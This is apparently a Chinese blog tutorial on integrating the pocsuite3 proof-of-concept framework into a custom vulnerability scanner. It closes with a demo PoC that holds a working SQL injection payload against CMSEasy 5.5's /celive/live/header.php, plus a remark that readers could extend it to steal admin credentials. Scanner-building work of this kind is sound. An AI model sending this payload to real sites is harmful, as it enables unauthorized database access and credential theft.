# 将pocsuite集成到扫描器里

## 前言
网上关于写基于`pocsuite`相关的`poc`文章很多，但很少有讲把`pocsuite`集成到自身扫描器里面的，虽然命令行界面可以美其名曰`黑客的仪式感`，但扫描器更重要的是考虑将`天堂的门票卖给最多的人`

## pocsuite3的安装
集成到python扫描器里，直接使用pip即可（指定了国内加速镜像）
`pip install pocsuite3 -i https://pypi.tuna.tsinghua.edu.cn/simple`

## 基于demo的修改
知道创宇之前有一个pocsuite的介绍文章[如何打造自己的PoC框架-Pocsuite3-使用篇](https://paper.seebug.org/904)，里面有一个集成的demo：
```python
from pocsuite3.api import init_pocsuite
from pocsuite3.api import start_pocsuite
from pocsuite3.api import get_result
from pocsuite3.api import path
import os

config = {
  'url': 'https://www.baidu.com/',
  'poc': os.path.join(paths.POCSUITE_ROOT_PATH, "../tests/login_demo.py"),
  'username': "asd",
  'password': 'asdss',
  'verbose': 0
}
# config字典的配置和cli命令行参数配置一模一样
init_pocsuite(config)
start_pocsuite()
result = get_results().pop()
print(result)
```

不过这个demo的导入包有点问题
![](https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220216221132.png)
修改一下
```python
from pocsuite3.api import get_results
from pocsuite3.api import paths
``` 
然后poc的路径又出现了问题
`'poc': os.path.join(paths.POCSUITE_ROOT_PATH, "../../pocs/test.py")`

这里前面拼接的path是
`C:\Users\Cl0udG0d\.virtualenvs\SZhe_Scan-oUVMoVqK\lib\site-packages\pocsuite3`
我虚拟环境包的位置

使用`os.path.dirname(os.path.dirname(__file__))`修改其为我当前文件的相对位置

`'poc': os.path.join(os.path.dirname(os.path.dirname(__file__)), "../pocs/test.py")`

在`pocs`文件夹下放置所有的poc文件，当需要扫描的时候读取文件夹下的所有POC依次进行扫描即可，当然这个地方也可以使用python的多线程来进行加速了

整个函数为
```python
def scanPoc(url):
    config = {
        'url': url,
        'poc': os.path.join(os.path.dirname(os.path.dirname(__file__)), "../pocs/test.py"),
        'verbose': 0
    }
    print(os.path.dirname(os.path.dirname(__file__)))
    # config字典的配置和cli命令行参数配置一模一样
    init_pocsuite(config)
    start_pocsuite()
    result = get_results().pop()
    print(result)
``` 
最后的`result`就是我们需要处理的返回结果，将其存储到数据库或者进一步操作，类型是`pocsuite`团队自己定义的`AttribDict`字典，通过键值对的方式读取内容

## 一个poc demo 
这里给出一个pocsuite 的 [poc demo](https://blog.csdn.net/weixin_44426869/article/details/103962994)

我们自定义的poc可以在demo上进行修改即可
```python
#导入所写PoC所需要类/文件，尽量不要使用第三方模块。
#迫不得已使用第三方模块有其依赖规则，后面给出。
from pocsuite3.api import Output,POCBase,register_poc,requests
#PoC实现类，继承POCBase
class DemoPoc(POCBase):
	#PoC信息字段，需要完整填写全部下列信息
	vulID = '88979' #漏洞编号，若提交漏洞的同时提交PoC，则写成0
    version = '1'#PoC版本，默认为1
    author = ['blh']#此PoC作者
    vulDate = '2014-11-03'#漏洞公开日期
    createDate = '2020-01-13'#编写PoC日期
    updateDate = '2020-01-13'#更新PoC日期，默认与createDate一样
    references = ['https://www.seebug.org/vuldb/ssvid-88979']#漏洞地址来源，0day不写
    name = 'CMSEasy 5.5 /celive/live/header.php SQL注入漏洞'#PoC名称
    appPowerLink = 'http://www.cmseasy.cn/'#漏洞产商主页
    appName = 'CMSEasy'#漏洞应用名称
    appVersion = '5.5'#漏洞影响版本
    vulType = 'SQL Injection'#漏洞类型
    desc = '''漏洞描述'''#在漏洞描述填写
    samples = []#测试成功网址
    install_requires = []#PoC依赖的第三方模块，尽量不要使用第三方模块，必要时参考后面给出的参考链接
    pocDesc = '''PoC用法描述'''#在PoC用法描述填写
    
 	#编写验证模式
	def  _verify(self):
        #验证代码
        result = {}
        target = self.url + '/celive/live/header.php'
        #此处payload即为post的数据
        payload = {
            'xajax': 'LiveMessage',
            'xajaxargs[0][name]': "1',(SELECT 1 FROM (select count(*),concat("
                                  "floor(rand(0)*2),(select md5(614)))a from "
                                  "information_schema.tables group by a)b),"
                                  "'','','','1','127.0.0.1','2') #"
        }
        # 使用requests发送post请求
        response = requests.post(target,payload)
        #‘851ddf5058cf22df63d3344ad89919cf’为0614的md5值
        if '851ddf5058cf22df63d3344ad89919cf' in str(response.content):
            result['VerifyInfo']={}
            result['VerifyInfo']['URL'] = target
            result['VerifyInfo']['Postdata'] = payload
        return self.parse_output(result)
	#编写攻击模式,此处直接给到验证模式，读者可以自行写出payload，获取管理员账号密码等信息。
	def _attack(self):
        return self._verify()
	#自定义输出函数，调用框架输出的实例Output
	def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

#注册PoC类，这样框架才知道这是PoC类
register_poc(DemoPoc)
``` 

## END 
 
建了一个微信的安全交流群，欢迎添加我微信备注`进群`，一起来聊天吹水哇，以及一个会发布安全相关内容的公众号，欢迎关注 :)
 
<div>
    <img  alt="GIF" src="https://springbird.oss-cn-beijing.aliyuncs.com/img/mmqrcode1632325540724.png"  width="280px" />
    <img  alt="GIF" src="https://springbird.oss-cn-beijing.aliyuncs.com/img/qrcode_for_gh_cead8e1080d6_344.jpg"  width="280px" />
</div>